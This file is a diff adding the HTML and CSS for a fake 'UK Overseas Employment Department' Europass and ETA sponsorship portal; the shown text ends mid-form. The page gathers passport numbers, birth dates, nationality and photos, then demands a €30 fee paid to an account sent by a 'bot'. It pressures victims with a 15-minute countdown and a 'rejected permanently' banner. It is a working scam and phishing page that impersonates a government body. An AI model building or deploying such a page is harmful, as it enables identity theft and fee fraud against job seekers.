@@ -1,0 +1,1843 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>UK Overseas Employment Department - Europass &amp; ETA Verification Portal</title>
+    <style>
+         :root {
+            --uk-navy-dark: #0b1c2d;
+            --uk-navy-mid: #162b48;
+            --uk-gold: #c5a059;
+            --uk-gold-light: #dfc285;
+            --uk-bg-ice: #f4f6f9;
+            --uk-card-white: #ffffff;
+            --text-dark: #111827;
+            --text-gray: #4b5563;
+            --success-green: #166534;
+            --error-red: #991b1b;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        html {
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+        
+        body {
+            background-color: var(--uk-bg-ice);
+            color: var(--text-dark);
+            line-height: 1.5;
+        }
+        
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+        
+        .ukpass-premium-identity-card img {
+            max-width: none;
+        }
+        
+        .hero-banner {
+            background: linear-gradient(135deg, var(--uk-navy-dark) 0%, var(--uk-navy-mid) 60%, #1e3a60 100%);
+            color: #ffffff;
+            padding: clamp(2rem, 6vw, 3.5rem) clamp(1rem, 4vw, 2rem) clamp(3rem, 7vw, 4.5rem);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 4px solid var(--uk-gold);
+        }
+        
+        .hero-banner::after {
+            content: "";
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            right: 0;
+            height: 40px;
+            background: var(--uk-bg-ice);
+            clip-path: ellipse(60% 40% at 50% 100%);
+        }
+        
+        .hero-content {
+            max-width: 850px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .hero-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1.25rem;
+            margin-bottom: 0.75rem;
+        }
+        
+        .official-crest {
+            width: 55px;
+            height: 55px;
+            background: radial-gradient(circle, #dfc285 0%, #c5a059 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            border: 2px solid #ffffff;
+        }
+        
+        .official-crest svg {
+            width: 32px;
+            height: 32px;
+            fill: var(--uk-navy-dark);
+        }
+        
+        .hero-logo-text h2 {
+            font-size: clamp(1.2rem, 4vw, 1.9rem);
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            line-height: 1.2;
+        }
+        
+        .hero-logo-text span {
+            font-size: 0.75rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            color: var(--uk-gold-light);
+            display: block;
+            margin-top: 4px;
+            font-weight: 700;
+        }
+        
+        .main-container {
+            width: 100%;
+            max-width: 950px;
+            margin: -2.5rem auto 4rem auto;
+            padding: 0 clamp(0.75rem, 3vw, 1.5rem);
+            position: relative;
+            z-index: 10;
+            box-sizing: border-box;
+        }
+        
+        .app-card {
+            width: 100%;
+            background: var(--uk-card-white);
+            border-radius: 16px;
+            box-shadow: 0 10px 35px rgba(11, 28, 45, 0.12);
+            padding: clamp(1.25rem, 4vw, 3rem);
+            box-sizing: border-box;
+            border-top: 5px solid var(--uk-gold);
+        }
+        
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 3.5rem;
+            position: relative;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .progress-bar::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background-color: #e2e8f0;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+        
+        .step-node {
+            background: var(--uk-card-white);
+            border: 3px solid #e2e8f0;
+            color: var(--text-gray);
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            z-index: 2;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .step-node.active {
+            border-color: var(--uk-gold);
+            background-color: var(--uk-gold);
+            color: var(--uk-navy-dark);
+            box-shadow: 0 0 12px rgba(197, 160, 89, 0.4);
+        }
+        
+        .step-node.completed {
+            border-color: var(--uk-navy-mid);
+            background-color: var(--uk-navy-mid);
+            color: white;
+        }
+        
+        .wizard-view {
+            display: none;
+        }
+        
+        .wizard-view.active {
+            display: block;
+        }
+        
+        h2.step-title {
+            font-size: clamp(1.1rem, 3.5vw, 1.4rem);
+            color: var(--uk-navy-dark);
+            margin-bottom: 2rem;
+            font-weight: 700;
+            border-bottom: 2px solid #edf2f7;
+            padding-bottom: 0.75rem;
+        }
+        
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        @media(min-width: 650px) {
+            .form-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .form-group label {
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: var(--text-gray);
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 6px;
+            font-size: 1rem;
+            color: var(--text-dark);
+            font-weight: 600;
+            transition: all 0.2s ease;
+            background-color: #f8fafc;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--uk-gold);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(197, 160, 89, 0.15);
+        }
+        
+        .upload-wrapper {
+            border: 2px dashed var(--uk-gold);
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+            background-color: #fcfbf9;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+        
+        .upload-wrapper:hover {
+            background-color: #f7f3eb;
+        }
+        
+        .pricing-table {
+            background-color: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .pricing-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.75rem;
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: var(--text-gray);
+        }
+        
+        .pricing-item.total-row {
+            border-top: 2px dashed #cbd5e0;
+            padding-top: 0.75rem;
+            margin-top: 0.75rem;
+            font-weight: 800;
+            color: var(--uk-navy-dark);
+            font-size: 1.2rem;
+        }
+        
+        .currency-converter-box {
+            background-color: #fdfbf7;
+            border: 1px solid #e6d5b8;
+            border-radius: 8px;
+            padding: 1.25rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .currency-label {
+            font-weight: 700;
+            color: #785a14;
+            font-size: 0.95rem;
+        }
+        
+        .currency-value {
+            font-size: 1.4rem;
+            font-weight: 900;
+            color: #59410a;
+            text-align: right;
+        }
+        
+        .bot-payment-details-card {
+            background: #fffbeb;
+            border: 2px solid var(--uk-gold);
+            border-radius: 10px;
+            padding: 1.25rem;
+            margin: 1.25rem 0;
+            text-align: left;
+        }
+        
+        .bot-payment-text {
+            font-size: 14px;
+            font-weight: bold;
+            color: var(--uk-navy-dark);
+            word-break: break-all;
+            white-space: pre-wrap;
+            user-select: all;
+            background: #ffffff;
+            padding: 0.75rem;
+            border-radius: 6px;
+            border: 1px solid #e6d5b8;
+            margin-bottom: 0.75rem;
+            min-height: 80px;
+        }
+        
+        .copy-btn {
+            background: var(--uk-gold);
+            color: var(--uk-navy-dark);
+            border: none;
+            padding: 0.5rem 1rem;
+            font-weight: 800;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            width: 100%;
+        }
+        
+        .actions-tray {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 2.5rem;
+        }
+        
+        .action-btn {
+            padding: 0.85rem 2rem;
+            border-radius: 6px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+        }
+        
+        .btn-fill {
+            background-color: var(--uk-navy-dark);
+            color: white;
+            box-shadow: 0 4px 12px rgba(11, 28, 45, 0.2);
+        }
+        
+        .btn-fill:hover {
+            background-color: var(--uk-navy-mid);
+            transform: translateY(-1px);
+        }
+        
+        .btn-outline {
+            background-color: #e2e8f0;
+            color: var(--text-dark);
+        }
+        
+        .btn-outline:hover {
+            background-color: #cbd5e0;
+        }
+        
+        .cashier-action-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            background-color: var(--uk-gold);
+            color: var(--uk-navy-dark);
+            text-decoration: none;
+            padding: 0.85rem 1.5rem;
+            border-radius: 6px;
+            font-weight: 800;
+            font-size: 1rem;
+            box-shadow: 0 4px 12px rgba(197, 160, 89, 0.3);
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        
+        .cashier-action-btn:hover {
+            background-color: #b38f49;
+        }
+        
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+            background: #fff;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            margin-top: 1rem;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid var(--uk-gold);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem auto;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .timer-badge {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+        
+        @keyframes shake {
+            0% {
+                transform: translate(1px, 1px) rotate(0deg);
+            }
+            10% {
+                transform: translate(-1px, -2px) rotate(-1deg);
+            }
+            20% {
+                transform: translate(-3px, 0px) rotate(1deg);
+            }
+            30% {
+                transform: translate(3px, 2px) rotate(0deg);
+            }
+            40% {
+                transform: translate(1px, -1px) rotate(1deg);
+            }
+            50% {
+                transform: translate(-1px, 2px) rotate(-1deg);
+            }
+            60% {
+                transform: translate(-3px, 1px) rotate(0deg);
+            }
+            70% {
+                transform: translate(3px, 1px) rotate(-1deg);
+            }
+            80% {
+                transform: translate(-1px, -1px) rotate(1deg);
+            }
+            90% {
+                transform: translate(1px, 2px) rotate(0deg);
+            }
+            100% {
+                transform: translate(1px, -2px) rotate(-1deg);
+            }
+        }
+        
+        .approval-success-popup {
+            display: none;
+            background: #f0fdf4;
+            border: 4px solid var(--success-green);
+            color: var(--success-green);
+            padding: 1.75rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(22, 101, 52, 0.25);
+            animation: shake 0.6s ease-in-out infinite alternate;
+        }
+        
+        .approval-success-popup h3 {
+            font-size: 1.5rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .approval-success-popup p {
+            font-size: 1.05rem;
+            font-weight: 800;
+        }
+        
+        .status-popup-banner {
+            display: none;
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            text-align: center;
+            font-weight: 800;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .status-popup-banner.decline {
+            background: #fef2f2;
+            border: 2px solid #ef4444;
+            color: #991b1b;
+        }
+        
+        .status-popup-banner.delay {
+            background: #fffbeb;
+            border: 2px solid #f59e0b;
+            color: #b45309;
+        }
+        
+        .status-popup-banner.reject {
+            background: #7f1d1d;
+            border: 3px solid #dc2626;
+            color: #ffffff;
+            animation: shake 0.5s ease-in-out infinite alternate;
+        }
+        
+        .welcome-greet-banner {
+            background: linear-gradient(135deg, var(--uk-navy-dark) 0%, var(--uk-navy-mid) 100%);
+            color: #ffffff;
+            padding: 2rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            box-shadow: 0 6px 20px rgba(11, 28, 45, 0.15);
+            border-left: 5px solid var(--uk-gold);
+        }
+        
+        .welcome-greet-banner h3 {
+            font-size: 1.6rem;
+            font-weight: 800;
+            margin-bottom: 0.35rem;
+        }
+        
+        .welcome-greet-banner p {
+            opacity: 0.95;
+            font-size: 1.05rem;
+            font-weight: 500;
+        }
+        
+        .fulfillment-notice-box {
+            background: linear-gradient(135deg, #fdfbf7 0%, #f7f1e3 100%);
+            border-left: 5px solid var(--uk-gold);
+            border-radius: 8px;
+            padding: 1.75rem;
+            margin-bottom: 2.5rem;
+            box-shadow: 0 4px 15px rgba(197, 160, 89, 0.1);
+        }
+        
+        .fulfillment-notice-box h4 {
+            color: #785a14;
+            font-size: 1.15rem;
+            margin-bottom: 0.5rem;
+            font-weight: 800;
+        }
+        
+        .fulfillment-notice-box p {
+            color: #59410a;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            font-weight: 600;
+        }
+        
+        .final-payment-gate {
+            background: #f8fafc;
+            border: 2px solid #cbd5e0;
+            border-radius: 12px;
+            padding: 1.75rem;
+            margin-bottom: 2.5rem;
+        }
+        
+        .final-payment-gate h3 {
+            color: var(--uk-navy-dark);
+            font-size: 1.25rem;
+            margin-bottom: 0.75rem;
+            font-weight: 800;
+        }
+        
+        .payment-channel-card {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 1.25rem;
+            margin-top: 1rem;
+        }
+        
+        .card-download-block {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 3.5rem;
+            background: #ffffff;
+            padding: clamp(1rem, 3vw, 2rem);
+            border-radius: 16px;
+            border: 1px solid #e2e8f0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        
+        .card-preview-wrap {
+            width: 100%;
+            max-width: 750px;
+            margin: 0 auto;
+            overflow: hidden;
+            container-type: inline-size;
+            container-name: cardpreview;
+        }
+        
+        .card-preview-scale {
+            width: 750px;
+            transform-origin: top center;
+            margin: 0 auto;
+        }
+        
+        @container cardpreview (max-width: 750px) {
+            .card-preview-scale {
+                transform: scale(calc(100cqw / 750));
+            }
+            .card-preview-wrap {
+                height: calc(475px * (100cqw / 750));
+            }
+        }
+        
+        .ukpass-premium-identity-card {
+            width: 750px;
+            height: 475px;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 15px 45px rgba(11, 28, 45, 0.18);
+            border: 1px solid rgba(197, 160, 89, 0.4);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            color: var(--uk-navy-dark);
+        }
+        
+        .premium-card-header {
+            background: linear-gradient(135deg, var(--uk-navy-dark) 0%, var(--uk-navy-mid) 60%, #1e3a60 100%);
+            padding: 1.25rem 2rem;
+            position: relative;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 22%;
+            flex: 0 0 22%;
+            z-index: 5;
+            box-sizing: border-box;
+            border-bottom: 3px solid var(--uk-gold);
+        }
+        
+        .premium-card-header::after {
+            content: "";
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            right: 0;
+            height: 25px;
+            background: white;
+            clip-path: ellipse(60% 45% at 50% 0%);
+            z-index: 4;
+        }
+        
+        .premium-card-header.alt-header-theme {
+            background: linear-gradient(135deg, #162b48 0%, #224370 60%, #2f568f 100%);
+        }
+        
+        .premium-header-brand-block {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            z-index: 10;
+        }
+        
+        .premium-header-brand-block svg {
+            height: 38px;
+            fill: #ffffff;
+        }
+        
+        .premium-header-labels h3 {
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 600;
+            color: var(--uk-gold-light);
+            line-height: 1;
+        }
+        
+        .premium-header-labels h2 {
+            font-size: clamp(1.15rem, 4vw, 1.8rem);
+            font-weight: 800;
+            margin: 0;
+            padding: 0;
+            border: none;
+            color: #ffffff;
+            line-height: 1.1;
+            letter-spacing: 0.5px;
+        }
+        
+        .premium-header-origin-tag {
+            font-weight: 400;
+            font-size: 0.75rem;
+            text-align: right;
+            opacity: 0.9;
+            line-height: 1.2;
+            z-index: 10;
+            letter-spacing: 0.5px;
+        }
+        
+        .premium-card-main-body {
+            display: flex;
+            flex-wrap: nowrap;
+            align-items: flex-start;
+            padding: 2rem;
+            flex: 1 1 auto;
+            position: relative;
+            background-color: #ffffff;
+            background-image: linear-gradient(to right, rgba(255, 255, 255, 1) 35%, rgba(255, 255, 255, 0.15) 70%, rgba(255, 255, 255, 0) 100%), url('https://images.unsplash.com/photo-1469854523086-cc02fe5d8800?auto=format&fit=crop&w=800&q=80');
+            background-size: cover;
+            background-position: right center;
+            z-index: 1;
+            box-sizing: border-box;
+            min-height: 0;
+        }
+        
+        .premium-uk-map-silhouette {
+            position: absolute;
+            right: 8%;
+            top: 5%;
+            height: 90%;
+            width: auto;
+            opacity: 0.2;
+            pointer-events: none;
+            z-index: 2;
+            filter: drop-shadow(0px 2px 8px rgba(11, 28, 45, 0.15));
+        }
+        
+        .premium-passport-photo-holder {
+            width: 22%;
+            min-width: 22%;
+            aspect-ratio: 1 / 1.26;
+            background-color: #f1f5f9;
+            border: 3px double var(--uk-gold);
+            border-radius: 12px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 1.5rem;
+            box-shadow: 0 4px 15px rgba(11, 28, 45, 0.1);
+            position: relative;
+            z-index: 5;
+            flex-shrink: 0;
+        }
+        
+        .premium-passport-photo-holder img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .premium-data-fields-column {
+            width: 48%;
+            flex: 1 1 48%;
+            min-width: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 0.45rem;
+            justify-content: center;
+            position: relative;
+            z-index: 5;
+        }
+        
+        .premium-field-row {
+            display: flex;
+            align-items: center;
+            font-size: 0.85rem;
+            line-height: 1.3;
+            border-bottom: 1px dashed rgba(11, 28, 45, 0.1);
+            padding-bottom: 0.25rem;
+        }
+        
+        .premium-field-label {
+            width: 38%;
+            flex-shrink: 0;
+            font-weight: 700;
+            color: #5a6e85;
+            text-transform: uppercase;
+            font-size: 0.68rem;
+            letter-spacing: 0.75px;
+        }
+        
+        .premium-field-value {
+            width: 62%;
+            flex: 1 1 62%;
+            min-width: 0;
+            font-weight: 800;
+            color: var(--uk-navy-dark);
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .premium-card-status-pane {
+            width: 22%;
+            min-width: 22%;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            justify-content: space-between;
+            position: relative;
+            z-index: 5;
+        }
+        
+        .premium-status-pill-badge {
+            background-color: #f0fdf4;
+            border: 2px solid #bbf7d0;
+            color: #166534;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-weight: 900;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 10px rgba(22, 101, 52, 0.1);
+            text-align: center;
+        }
+        
+        .premium-qr-code-holder {
+            background: white;
+            padding: 0.35rem;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            width: clamp(56px, 11vw, 85px);
+            height: clamp(56px, 11vw, 85px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        
+        .premium-qr-code-holder svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .premium-card-footer-ribbon {
+            background-color: #f8fafc;
+            border-top: 1px solid rgba(11, 28, 45, 0.08);
+            padding: 0.65rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.7rem;
+            color: #5a6e85;
+            height: 13%;
+            flex: 0 0 13%;
+            position: relative;
+            z-index: 5;
+            border-bottom: 6px solid var(--uk-navy-dark);
+            box-sizing: border-box;
+            gap: 0.5rem;
+        }
+        
+        .card-export-host {
+            position: fixed;
+            left: -12000px;
+            top: 0;
+            width: 750px;
+            overflow: visible;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .card-export-host .ukpass-premium-identity-card {
+            width: 750px !important;
+            height: 475px !important;
+            transform: none !important;
+        }
+        
+        .card-export-host .card-preview-scale {
+            transform: none !important;
+        }
+        
+        .download-lock-note {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            margin-top: 0.75rem;
+            padding: 0.75rem 1rem;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 8px;
+            color: #991b1b;
+            font-size: 0.9rem;
+            font-weight: 700;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header class="hero-banner">
+        <div class="hero-content">
+            <div class="hero-logo">
+                <div class="official-crest">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 2.18l7 3.89v4.93c0 4.54-3.15 8.81-7 9.87-3.85-1.06-7-5.33-7-9.87V8.07l7-3.89zM11 11h2v6h-2v-6zm0-4h2v2h-2V7z"/>
+                    </svg>
+                </div>
+                <div class="hero-logo-text">
+                    <h2>UK Overseas Employment Department</h2>
+                    <span>Europass &amp; ETA Verification for Visa Sponsorship</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <div class="app-card">
+
+            <div class="progress-bar">
+                <div class="step-node active" id="node-1">1</div>
+                <div class="step-node" id="node-2">2</div>
+                <div class="step-node" id="node-3">3</div>
+            </div>
+
+            <!-- REAL-TIME DYNAMIC STATUS NOTIFICATION POPUPS -->
+            <div class="approval-success-popup" id="approvalSuccessPopup">
+                <h3>🎉 Congratulations! Payment Approved</h3>
+                <p>Your payment has been successfully verified in real time. You are now authorized to download your official documents below!</p>
+            </div>
+
+            <div class="status-popup-banner decline" id="declinePopupBanner">
+                ❌ Payment Not Received: Your transaction could not be verified by the cashier. Please verify your reference or try again.
+            </div>
+
+            <div class="status-popup-banner delay" id="delayPopupBanner">
+                ⏳ Waiting for Payment to be Processed: Your submission is currently queued for manual cashier auditing. Please stand by.
+            </div>
+
+            <div class="status-popup-banner reject" id="rejectPopupBanner">
+                🚫 APPLICATION REJECTED PERMANENTLY: Never to apply again. Your profile has been flagged and barred from future processing.
+            </div>
+
+            <!-- STEP 1: IDENTITY REGISTRATION -->
+            <div class="wizard-view active" id="view-step-1">
+                <h2 class="step-title">1. Sponsor Profile &amp; Europass Verification</h2>
+
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="inputFirstName">Given Names / First Name</label>
+                        <input type="text" id="inputFirstName" class="form-input">
+                    </div>
+                    <div class="form-group">
+                        <label for="inputLastName">Surname / Last Name</label>
+                        <input type="text" id="inputLastName" class="form-input">
+                    </div>
+                </div>
+
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="inputPassport">Passport Serial Number</label>
+                        <input type="text" id="inputPassport" class="form-input">
+                    </div>
+                    <div class="form-group">
+                        <label for="inputDOB">Date of Birth</label>
+                        <input type="date" id="inputDOB" class="form-input">
+                    </div>
+                </div>
+
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="inputResidence">Country of Nationality / Residence</label>
+                        <select id="inputResidence" class="form-input">
+                            <option value="">Select your passport issuing nation...</option>
+                            <option value="United Kingdom">United Kingdom (GBP)</option>
+                            <option value="United States">United States (USD)</option>
+                            <option value="Eurozone">Eurozone Countries (EUR)</option>
+                            <option value="South Africa">South Africa (ZAR)</option>
+                            <option value="Philippines">Philippines (PHP)</option>
+                            <option value="India">India (INR)</option>
+                            <option value="Nigeria">Nigeria (NGN)</option>
+                            <option value="Ghana">Ghana (GHS)</option>
+                            <option value="Kenya">Kenya (KES)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Biometric Portrait Upload</label>
+                        <div class="upload-wrapper" onclick="document.getElementById('hiddenFileInput').click()">
+                            <input type="file" id="hiddenFileInput" style="display:none;" accept="image/*">
+                            <strong style="color: #785a14; font-size: 0.95rem;">Select Photo Asset</strong>
+                            <div id="uploadFeedback" style="margin-top: 0.4rem; font-size: 0.85rem; font-weight: 700; color: var(--uk-navy-dark);"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="actions-tray" style="justify-content: flex-end;">
+                    <button type="button" class="action-btn btn-fill" onclick="navigateStep2()">Continue to Verification Preview</button>
+                </div>
+            </div>
+
+            <!-- STEP 2: VERIFICATION PREVIEW -->
+            <div class="wizard-view" id="view-step-2">
+                <h2 class="step-title">2. Processing Review &amp; Pre-Authorization</h2>
+
+                <div class="pricing-table">
+                    <div class="pricing-item">
+                        <span>Europass Verification (€15.00) &amp; Visa Sponsorship ETA (€15.00):</span>
+                        <span id="fee-total-gbp">€30.00 EUR</span>
+                    </div>
+                    <div class="pricing-item total-row">
+                        <span>Total Combined Processing Fee:</span>
+                        <span id="fee-total-display">€30.00 EUR</span>
+                    </div>
+                </div>
+
+                <div class="currency-converter-box">
+                    <div>
+                        <div class="currency-label" id="fx-title">Converted Local Currency Equivalent</div>
+                        <div id="fx-breakdown" style="font-size: 0.8rem; color: var(--text-gray); margin-top: 0.35rem; line-height: 1.5;">Calculated automatically based on your selected nationality.</div>
+                    </div>
+                    <div class="currency-value" id="fx-amount">--</div>
+                </div>
+
+                <p style="font-size: 0.95rem; line-height: 1.6; margin-bottom: 1.5rem;">
+                    Your profile data has been structured for verification (€15.00 per document = €30.00 EUR total). Click below to generate your official sponsorship documents and request your payment account details.
+                </p>
+
+                <div class="actions-tray">
+                    <button type="button" class="action-btn btn-outline" onclick="navigateBack1()">Modify Profile Data</button>
+                    <button type="button" class="action-btn btn-fill" onclick="processVerificationPreview()">Verify &amp; Generate Documents</button>
+                </div>
+            </div>
+
+            <!-- STEP 3: FINAL PASS & CASHIER PAYMENT GATEWAY -->
+            <div class="wizard-view" id="view-step-3">
+
+                <div class="welcome-greet-banner">
+                    <h3>Document Generated &amp; Verified, <span id="clientGreetName">Applicant</span>!</h3>
+                    <p>Your official sponsorship passes are generated below (€30.00 EUR total). Request your payment account details from our cashier desk to settle your processing fee.</p>
+                </div>
+
+                <div class="fulfillment-notice-box">
+                    <h4>Payment Account &amp; Verification Mandate</h4>
+                    <p>
+                        <strong>INSTRUCTIONS:</strong> Click the button below to request your assigned local payment account from the cashier. Once your payment details arrive from your bot, the <strong>15-minute countdown timer</strong> will start automatically.
+                    </p>
+                </div>
+
+                <!-- PAYMENT GATEWAY -->
+                <div class="final-payment-gate">
+                    <h3 id="paymentGateTitle">Secure Cashier Payment Gateway</h3>
+
+                    <!-- REQUEST BUTTON -->
+                    <div id="requestPaymentSection" style="margin-top: 1rem;">
+                        <button type="button" class="cashier-action-btn" onclick="requestPaymentDetailsFromBot()">
+                            💳 Get Payment Detail from Cashier
+                        </button>
+                    </div>
+
+                    <!-- LOADING STATE / BOT DISPATCH SYNC BOX -->
+                    <div id="paymentLoadingState" class="loading-container">
+                        <div class="spinner"></div>
+                        <p style="font-weight: 700; color: var(--uk-navy-dark); font-size: 1rem;">Waiting for cashier to dispatch payment details...</p>
+                        <p style="font-size: 0.85rem; color: var(--text-gray); margin-top: 0.25rem;">Polling active. Alternatively, instantly paste payment details sent from your bot below:</p>
+
+                        <div style="margin-top: 1.5rem; text-align: left; background: #f8fafc; padding: 1.25rem; border-radius: 8px; border: 2px solid var(--uk-gold);">
+                            <label style="font-size: 0.75rem; font-weight: 800; color: #785a14; text-transform: uppercase; display: block; margin-bottom: 0.5rem;">⚡ Instant Bot Payment Dispatch Sync:</label>
+                            <textarea id="instantBotPaymentInput" class="form-input" rows="4" placeholder="Paste exact payment details sent from bot here..."></textarea>
+                            <button type="button" class="action-btn btn-fill" onclick="applyInstantBotPayment()" style="margin-top: 0.75rem; background-color: var(--uk-gold); color: var(--uk-navy-dark); width: 100%;">🚀 Display Details &amp; Start 15-Min Timer</button>
+                        </div>
+                    </div>
+
+                    <!-- REAL-TIME DYNAMIC PAYMENT DETAILS BLOCK -->
+                    <div id="dynamicPaymentDetailsBlock" style="display:none;" class="payment-channel-card">
+                        <div class="timer-badge" id="countdownTimerBox">
+                            ⏳ Time Remaining to Pay: <span id="timerDisplay">15:00</span>
+                        </div>
+
+                        <div class="bot-payment-details-card">
+                            <div style="font-weight: 800; font-size: 0.9rem; color: #785a14; margin-bottom: 0.5rem;" id="assignedChannelTitle">🇬🇧 Assigned Payment Details (Dispatched from Bot):</div>
+                            <div class="bot-payment-text" id="assignedAccountDetails"></div>
+                            <button type="button" class="copy-btn" onclick="copyPaymentDetails()">📋 Copy Payment Details</button>
+                        </div>
+
+                        <div style="margin-top: 1.25rem;" class="form-grid">
+                            <div class="form-group">
+                                <label for="amountPaid">Amount Paid (€30.00 EUR / Local Equivalent)</label>
+                                <input type="number" id="amountPaid" class="form-input" min="0" step="0.01" placeholder="30.00">
+                            </div>
+                            <div class="form-group">
+                                <label>Upload Payment Receipt Screenshot</label>
+                                <div class="upload-wrapper" onclick="document.getElementById('receiptFileInput').click()" style="padding: 0.75rem;">
+                                    <input type="file" id="receiptFileInput" style="display:none;" accept="image/*">
